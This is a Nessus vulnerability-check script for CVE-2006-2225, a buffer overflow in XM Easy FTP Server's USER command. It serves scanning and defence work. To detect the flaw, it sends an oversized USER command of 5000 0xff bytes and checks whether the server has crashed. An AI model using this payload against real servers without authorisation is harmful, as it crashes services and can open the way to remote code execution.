#
# (C) Tenable Network Security
#


if (description)
{
  script_id(21338);
  script_version("$Revision: 1.5 $");

  script_cve_id("CVE-2006-2225");
  script_bugtraq_id(17836);
  script_xref(name:"OSVDB", value:"25277");
 
  script_name(english:"XM Easy FTP Server USER Command Buffer Overflow Vulnerability");
  script_summary(english:"Checks for USER command buffer overflow vulnerability in XM Easy FTP Server");
 
 desc = "
Synopsis :

The remote FTP server is affected by a buffer overflow flaw. 

Description :

The remote host appears to be using XM Easy FTP Server, a personal FTP
server for Windows. 

The version of XM Easy FTP Server installed on the remote host
contains a buffer overflow vulnerability that can be exploited by an
unauthenticated user with a specially-crafted USER command to crash
the affected application or execute arbitrary code on the affected
host. 

See also :

http://www.securityfocus.com/archive/1/432960/30/0/threaded

Solution : 

Unknown at this time.

Risk factor : 

Medium / CVSS Base Score : 6.9
(AV:R/AC:L/Au:NR/C:P/I:P/A:P/B:N)";
  script_description(english:desc);
 
  script_category(ACT_DENIAL);
  script_family(english:"Gain root remotely");
 
  script_copyright(english:"This script is Copyright (C) 2006 Tenable Network Security");

  script_dependencies("ftpserver_detect_type_nd_version.nasl");
  script_require_ports("Services/ftp", 21);

  exit(0);
}


include("ftp_func.inc");
include("global_settings.inc");


port = get_kb_item("Services/ftp");
if (!port) port = 21;
if (!get_port_state(port)) exit(0);


soc = open_sock_tcp(port);
if (!soc) exit(0);


# Make sure it's XM Easy FTP Server.
#
# nb: the banner is configurable so don't exit if we're paranoid.
banner = ftp_recv_line(socket:soc);
if ( ! banner ) exit(0);
if ( report_paranoia < 2 && "Welcome to DXM's FTP Server" >!< banner) exit(0);


# Try to exploit the flaw to crash the daemon.
c = string("USER ", crap(data:raw_string(0xff), length:5000));
send(socket:soc, data:string(c, "\r\n"));
s = ftp_recv_line(socket:soc);


# If we didn't get a response...
if (isnull(s))
{
  sleep(1);

  # Try to reestablish a connection and read the banner.
  soc2 = open_sock_tcp(port);
  if (soc2) s2 = ftp_recv_line(socket:soc2);

  # If we couldn't establish the connection or read the banner,
  # there's a problem.
  if (!soc2 || !strlen(s2)) {
    security_warning(port);
    exit(0);
  }
  close(soc2);
}
